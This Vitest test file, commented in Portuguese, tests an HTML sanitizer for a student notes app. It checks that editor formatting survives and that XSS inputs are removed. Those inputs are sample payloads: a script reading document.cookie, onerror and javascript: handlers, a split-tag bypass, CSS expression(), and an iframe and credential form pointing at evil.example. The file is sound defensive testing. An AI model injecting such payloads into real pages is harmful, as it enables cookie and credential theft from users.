import { describe, it, expect } from "vitest"
import { sanitizarHtml } from "@/lib/sanitizar"
import { htmlTemConteudo } from "@/lib/unidades"

describe("sanitizarHtml — o que precisa passar", () => {
  it("mantém a formatação que o aluno usa de verdade", () => {
    const html =
      "<h2>Enzimas</h2><p><strong>Catalisadores</strong> que <em>aceleram</em> reações.</p>"
    expect(sanitizarHtml(html)).toBe(html)
  })

  it("mantém lista, tabela e citação", () => {
    const html =
      "<ul><li>Um</li><li>Dois</li></ul>" +
      "<table><tbody><tr><th>A</th><td>B</td></tr></tbody></table>" +
      "<blockquote><p>Citação</p></blockquote>"
    expect(sanitizarHtml(html)).toBe(html)
  })

  it("mantém a imagem do Cloudinary com legenda", () => {
    const html =
      '<figure class="image"><img src="https://res.cloudinary.com/x/y.png" alt="Diagrama">' +
      "<figcaption>Ciclo de Krebs</figcaption></figure>"
    const limpo = sanitizarHtml(html)
    expect(limpo).toContain("res.cloudinary.com/x/y.png")
    expect(limpo).toContain("Ciclo de Krebs")
    expect(limpo).toContain('alt="Diagrama"')
  })

  it("mantém link externo", () => {
    const limpo = sanitizarHtml('<p><a href="https://unip.br">UNIP</a></p>')
    expect(limpo).toContain('href="https://unip.br"')
  })
})

describe("sanitizarHtml — o que não pode passar", () => {
  it("remove script", () => {
    const limpo = sanitizarHtml('<p>Oi</p><script>alert(document.cookie)</script>')
    expect(limpo).not.toContain("script")
    expect(limpo).toContain("Oi")
  })

  it("remove manipulador de evento inline", () => {
    // O vetor mais provável: colar de um site um img com onerror.
    const limpo = sanitizarHtml('<img src="x" onerror="alert(1)">')
    expect(limpo).not.toContain("onerror")
    expect(limpo).not.toContain("alert")
  })

  it("remove href com javascript:", () => {
    const limpo = sanitizarHtml('<a href="javascript:alert(1)">clique</a>')
    expect(limpo).not.toContain("javascript:")
  })

  it("remove iframe", () => {
    const limpo = sanitizarHtml('<iframe src="https://evil.example"></iframe>')
    expect(limpo).not.toContain("iframe")
  })

  it("remove style, que carrega CSS arbitrário", () => {
    const limpo = sanitizarHtml('<p style="position:fixed;inset:0">texto</p>')
    expect(limpo).not.toContain("style=")
    expect(limpo).toContain("texto")
  })

  it("remove formulário, que rouba credencial por cima da página", () => {
    const limpo = sanitizarHtml('<form action="https://evil.example"><input name="senha"></form>')
    expect(limpo).not.toContain("<form")
    expect(limpo).not.toContain("<input")
  })

  it("não deixa passar tag mal fechada como escape", () => {
    const limpo = sanitizarHtml('<p>a</p><scr<script>ipt>alert(1)</script>')
    expect(limpo.toLowerCase()).not.toContain("<script")
  })
})

describe("htmlTemConteudo", () => {
  it("reconhece parágrafo vazio do editor como vazio", () => {
    // O CKEditor devolve isto quando o aluno apaga tudo; sem a checagem a
    // folha de revisão ganharia uma seção com título e nada embaixo.
    expect(htmlTemConteudo("<p>&nbsp;</p>")).toBe(false)
    expect(htmlTemConteudo("<p></p>")).toBe(false)
    expect(htmlTemConteudo("   ")).toBe(false)
  })

  it("trata nulo e indefinido como vazio", () => {
    expect(htmlTemConteudo(null)).toBe(false)
    expect(htmlTemConteudo(undefined)).toBe(false)
  })

  it("reconhece texto", () => {
    expect(htmlTemConteudo("<p>Resumo da aula</p>")).toBe(true)
  })

  it("imagem sozinha conta como conteúdo", () => {
    // Resumo pode ser só o diagrama recortado do slide.
    expect(htmlTemConteudo('<figure><img src="https://x/y.png"></figure>')).toBe(true)
  })
})

describe("sanitizarHtml — saída real do CKEditor", () => {
  // Capturado do editor rodando no navegador, não escrito à mão: é o que
  // realmente chega na Server Action.
  it("preserva lista e negrito, descartando só o atributo interno", () => {
    const real =
      '<ul><li class="ck-list-marker-bold" data-list-item-id="e078ab768b8e5fc6">' +
      "<strong>Ciclo de Krebs</strong></li></ul>"
    const limpo = sanitizarHtml(real)

    expect(limpo).toContain("<ul>")
    expect(limpo).toContain("<li")
    expect(limpo).toContain("<strong>Ciclo de Krebs</strong>")
    // O id de controle do editor não serve para nada depois de gravado.
    expect(limpo).not.toContain("data-list-item-id")
  })

  it("preserva a figura com legenda e corta o style de redimensionamento", () => {
    const real =
      '<figure class="image image_resized" style="width:40%">' +
      '<img src="https://res.cloudinary.com/a/b.png" alt="Diagrama">' +
      "<figcaption>Ciclo</figcaption></figure>"
    const limpo = sanitizarHtml(real)

    expect(limpo).toContain("res.cloudinary.com/a/b.png")
    expect(limpo).toContain("<figcaption>Ciclo</figcaption>")
    expect(limpo).toContain('alt="Diagrama"')
    expect(limpo).not.toContain("style=")
  })

  it("põe rel de segurança no link que abre em nova aba", () => {
    // Sem rel, a página aberta ganha acesso a window.opener.
    const limpo = sanitizarHtml('<a href="https://unip.br" target="_blank">UNIP</a>')
    expect(limpo).toContain('rel="noopener noreferrer"')
  })
})

describe("sanitizarHtml — fidelidade do que foi editado", () => {
  it("preserva o alinhamento de parágrafo", () => {
    // Sem isto o aluno centraliza um título e ele volta à esquerda na leitura.
    const limpo = sanitizarHtml('<p style="text-align: center">Centralizado</p>')
    expect(limpo).toContain("text-align")
    expect(limpo).toContain("center")
  })

  it("preserva a largura da imagem redimensionada", () => {
    const limpo = sanitizarHtml('<img src="https://res.cloudinary.com/a.png" style="width: 40%">')
    expect(limpo).toContain("width")
    expect(limpo).toContain("40%")
  })

  it("preserva a largura de coluna da tabela", () => {
    const limpo = sanitizarHtml(
      '<table><colgroup><col style="min-width: 120px"></colgroup>' +
        "<tbody><tr><td>A</td></tr></tbody></table>"
    )
    expect(limpo).toContain("colgroup")
    expect(limpo).toContain("120px")
  })

  it("descarta propriedade de CSS fora da lista, mesmo junto de uma válida", () => {
    // O ataque real: esconder position:fixed atrás de um text-align inocente.
    const limpo = sanitizarHtml(
      '<p style="text-align: center; position: fixed; inset: 0; z-index: 9999">x</p>'
    )
    expect(limpo).toContain("text-align")
    expect(limpo).not.toContain("position")
    expect(limpo).not.toContain("z-index")
    expect(limpo).not.toContain("inset")
  })

  it("descarta valor fora do formato esperado", () => {
    expect(sanitizarHtml('<p style="text-align: url(javascript:alert(1))">x</p>')).not.toContain(
      "javascript"
    )
    expect(sanitizarHtml('<img src="https://a/b.png" style="width: expression(alert(1))">'))
      .not.toContain("expression")
  })

  it("não deixa style passar em elemento que não o declara", () => {
    // `width` só é permitido em img e col; num div viraria caixa arbitrária.
    const limpo = sanitizarHtml('<div style="width: 100px">x</div>')
    expect(limpo).not.toContain("width")
  })
})
